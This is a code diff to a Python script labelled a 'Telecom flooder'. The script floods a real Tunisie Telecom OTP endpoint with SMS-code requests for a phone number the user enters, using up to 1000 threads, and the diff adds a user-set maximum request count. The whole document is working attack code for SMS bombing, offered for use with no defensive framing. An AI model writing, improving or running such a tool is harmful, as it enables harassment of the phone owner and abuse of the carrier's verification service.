@@ -10,32 +10,39 @@ init(autoreset=True)
 
 request_count = 0
 lock = Lock()
+stop_event = threading.Event()
 
-def send_otp(phone_number):
+def send_otp(phone_number, max_requests):
     global request_count
     url = f"https://myttauth.tunisietelecom.tn/realms/selfcareportal/sms/otp-code?phoneNumber={phone_number}"
-    try:
-        requests.get(url, timeout=5)
+    while True:
         with lock:
+            if request_count >= max_requests or stop_event.is_set():
+                stop_event.set()
+                break
             request_count += 1
-    except:
-        pass
+        try:
+            requests.get(url, timeout=5)
+        except:
+            pass  # ignore errors/timeouts
 
-def worker(phone_number):
-    while True:
-        send_otp(phone_number)
+def worker(phone_number, max_requests):
+    send_otp(phone_number, max_requests)
 
-def show_counter():
+def show_counter(max_requests):
     spinner = itertools.cycle(['|', '/', '-', '\\'])
-    while True:
+    while not stop_event.is_set():
         with lock:
             count = request_count
         spin = next(spinner)
-        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count}", end='', flush=True)
+        print(f"\r{Fore.CYAN}[{spin}] {Fore.GREEN}Sent requests: {count} / {max_requests}", end='', flush=True)
+        if count >= max_requests:
+            break
         time.sleep(0.1)
+    print(f"\n{Fore.YELLOW}Done! Sent {request_count} requests.")
 
 def main():
-    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 95467473): ").strip()
+    phone_number = input(Fore.CYAN + "Enter phone number (e.g. 97979797): ").strip()
     if not phone_number.isdigit() or len(phone_number) != 8:
         print(Fore.RED + "Invalid phone number. Must be 8 digits.")
         return
@@ -48,16 +55,24 @@ def main():
         print(Fore.RED + "Invalid thread count. Must be between 10 and 1000.")
         return
 
-    print(Fore.GREEN + f"\n🚀 Launching Telecom flooder with {thread_count} threads targeting {phone_number}...\n")
+    try:
+        max_requests = int(input(Fore.CYAN + "How many SMS/requests to send?: ").strip())
+        if max_requests <= 0:
+            raise ValueError
+    except ValueError:
+        print(Fore.RED + "Invalid number of requests.")
+        return
+
+    print(Fore.GREEN + f"\n🚀 Launching Telecom flooder with {thread_count} threads targeting {phone_number} to send {max_requests} requests...\n")
 
     global request_count
     request_count = 0
 
-    threading.Thread(target=show_counter, daemon=True).start()
+    threading.Thread(target=show_counter, args=(max_requests,), daemon=True).start()
 
     with ThreadPoolExecutor(max_workers=thread_count) as executor:
         for _ in range(thread_count):
-            executor.submit(worker, phone_number)
+            executor.submit(worker, phone_number, max_requests)
 
 if __name__ == "__main__":
     main()
